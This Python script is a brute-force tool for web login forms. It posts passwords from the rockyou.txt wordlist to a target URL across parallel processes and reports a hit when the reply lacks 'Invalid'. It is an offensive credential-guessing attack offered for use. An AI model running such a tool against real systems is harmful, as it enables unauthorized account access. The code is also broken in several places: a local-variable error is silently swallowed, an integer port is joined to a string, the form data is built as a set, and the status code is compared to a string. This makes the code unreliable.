import multiprocessing
import requests
import time
from contextlib import suppress
import sys
import argparse

url_full=""
portNo=0
payloadName=""
numThreads=1

def testpw(word):
    try:
        if portNo > 0:
            url_full = url_full + ":" + portNo
    
            print(url_full)
            print(payloadName)
            print(word)

            payload = {payloadName, word}
            r = requests.post(url_full, data = payload)
            res = r.text
            print(res)
            exit
    
            if r.status_code != "200":
                print (r.status_code)
    
                if "Invalid" not in res:
                    print("password is " + word)
    
    except:
        #print("sleeping..." + word)
        time.sleep(0.2)


def main():
    parser = argparse.ArgumentParser(description='Brute force an HTML POST request using rockyou.txt')
    parser.add_argument('-u', type=str, help='the target URL where we are POSTing to', required=True)
    parser.add_argument('-p', type=int, help='target port if required', required=False)
    parser.add_argument('-P', type=str, help='payload (name) to be brute forced', required=True)
    parser.add_argument('-tc',type=int, help='thread count to use (max 20)', required=False)

    args = parser.parse_args()

    global url_full
    if str(args.u) != "":
        url_full = str(args.u)

    global portNo
    if args.p is not None:
        portNo = args.p

    global payloadName
    if args.P is not None:
        payloadName=args.P

    #check for a thread-count argument, and apply it if necessary
    numThreads = 10
    if args.tc is not None:
        if args.tc <= 20 and args.tc >= 0:
            numThreads = args.tc

    #open the wordlist, encoded correctly, and split into an array
    wl = open("rockyou.txt", encoding='latin-1').read().splitlines()

    print("wordlist loaded, attacking: %s %d {%s} x %d..." % (url_full, portNo, payloadName, numThreads))

    maxThreads = multiprocessing.Semaphore(multiprocessing.cpu_count())

    if numThreads > maxThreads.get_value():
        print("Num cores: %d, using that instead of %d" % (maxThreads.get_value(), numThreads))
        numThreads = maxThreads.get_value()
    
    p = multiprocessing.Pool(numThreads)
    p.map(testpw, wl[:2000])

if __name__ == "__main__":
    main()

   

